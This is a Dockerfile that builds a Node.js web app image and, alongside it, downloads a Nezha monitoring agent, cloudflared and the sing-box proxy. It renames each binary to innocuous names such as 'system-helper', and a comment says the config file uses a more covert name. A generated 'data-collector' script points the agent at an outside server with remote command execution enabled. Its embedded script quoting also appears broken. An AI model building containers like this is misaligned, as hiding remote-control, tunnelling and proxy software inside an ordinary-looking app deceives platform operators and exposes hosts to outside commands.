FROM node:18-alpine AS builder

WORKDIR /build

# 安装构建依赖
COPY package*.json ./
RUN npm ci --only=production

# 第二阶段：运行环境
FROM node:18-alpine

WORKDIR /app

# 安装必要的工具
RUN apk add --no-cache bash curl wget unzip tzdata ca-certificates && \
    cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && \
    echo "Asia/Shanghai" > /etc/timezone && \
    apk del tzdata

# 创建必要的目录
RUN mkdir -p /app/config /app/bin /app/storage /app/db

# 复制应用文件
COPY --from=builder /build/node_modules ./node_modules
COPY server.js package.json ./
COPY public ./public
COPY views ./views
COPY config ./config
COPY entrypoint.sh ./

# 下载哪吒Agent
RUN cd /tmp && \
    wget -O nezha-agent.zip https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip && \
    unzip nezha-agent.zip && \
    mv nezha-agent /app/bin/agent-core && \
    rm -rf /tmp/* && \
    chmod +x /app/bin/agent-core

# 下载cloudflared
RUN cd /tmp && \
    wget -O cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && \
    mv cloudflared /app/bin/network-connector && \
    chmod +x /app/bin/network-connector && \
    rm -rf /tmp/*

# 下载sing-box
RUN cd /tmp && \
    wget -O sing-box.tar.gz https://github.com/SagerNet/sing-box/releases/download/v1.5.0/sing-box-1.5.0-linux-amd64.tar.gz && \
    tar -xzf sing-box.tar.gz && \
    mv sing-box-*/sing-box /app/bin/system-helper && \
    chmod +x /app/bin/system-helper && \
    rm -rf /tmp/*

# 创建data-collector脚本
RUN echo '#!/bin/bash
cd "$(dirname "$0")" || exit 1

# 配置文件路径 - 使用更隐蔽的名称
CONFIG_FILE="../config/monitor.conf"

# 从环境变量获取配置，如果没有则使用默认值
NEZHA_SERVER=${DATA_REPORT_HOST:-"nezha.example.com"}
NEZHA_PORT=${DATA_REPORT_PORT:-"5555"}
NEZHA_KEY=${DATA_REPORT_KEY:-"defaultkey123456789"}

# 生成配置文件
cat > "$CONFIG_FILE" << EOF
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${NEZHA_SERVER}:${NEZHA_PORT}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: $(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "$(date +%s)$(head -c 4 /dev/urandom | od -t x1 | head -n1 | cut -d'\'' '\'' -f2- | tr -d '\'' '\'')")\nEOF\n\necho "生成配置文件: $CONFIG_FILE"\necho "服务器地址: ${NEZHA_SERVER}:${NEZHA_PORT}"\necho "启动监控服务..."\n\n# 启动Agent\n./agent-core -c "$CONFIG_FILE" "$@"' > /app/bin/data-collector && \
    chmod +x /app/bin/data-collector

# 设置权限
RUN chmod +x /app/entrypoint.sh

# 暴露端口
EXPOSE 8080

# 启动命令
ENTRYPOINT ["/app/entrypoint.sh"] 